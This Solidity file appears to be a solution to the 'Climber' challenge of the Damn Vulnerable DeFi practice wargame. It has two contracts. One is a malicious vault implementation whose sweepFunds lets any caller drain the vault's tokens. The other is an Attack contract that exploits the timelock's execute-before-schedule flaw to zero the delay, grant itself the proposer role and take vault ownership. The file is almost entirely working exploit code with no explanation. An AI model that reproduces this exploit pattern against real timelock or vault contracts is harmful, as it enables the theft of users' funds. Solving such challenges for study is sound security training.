// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {ClimberTimelock} from "./ClimberTimelock.sol";
import {ClimberVault} from "./ClimberVault.sol";
import {ADMIN_ROLE, PROPOSER_ROLE, MAX_TARGETS, MIN_TARGETS, MAX_DELAY, WITHDRAWAL_LIMIT, WAITING_PERIOD} from "./ClimberConstants.sol";
import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

import {CallerNotSweeper, InvalidWithdrawalAmount, InvalidWithdrawalTime} from "./ClimberErrors.sol";

contract ClimberVault_Broken is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    function initialize(
        address admin,
        address proposer,
        address sweeper
    ) external initializer {
        __Ownable_init(msg.sender);
        __UUPSUpgradeable_init();
    }

    function sweepFunds(address token) external {
        SafeTransferLib.safeTransfer(token, msg.sender, IERC20(token).balanceOf(address(this)));
    }

    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}


contract Attack {
    ClimberTimelock public immutable lock;
    ClimberVault public immutable vault;
    address public immutable player;
    constructor(ClimberTimelock _lock, ClimberVault _vault, address _player){
        lock = _lock;
        vault = _vault;
        player = _player;
    }

    function attack() public {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);

        targets[1] = address(lock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)",PROPOSER_ROLE,address(this));

        targets[0] = address(lock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        targets[2] = address(vault);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature("transferOwnership(address)", player);

        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature("schedule()");

        lock.execute(targets, values, dataElements, "0x0");
    }

    function schedule() public {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);

        targets[1] = address(lock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)",PROPOSER_ROLE, address(this));//abi.encodeWithSignature("transferOwnership(address)", address(this));

        targets[0] = address(lock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        targets[2] = address(vault);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature("transferOwnership(address)", player);

        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature("schedule()");

        lock.schedule(targets, values, dataElements,  "0x0");
    }   
}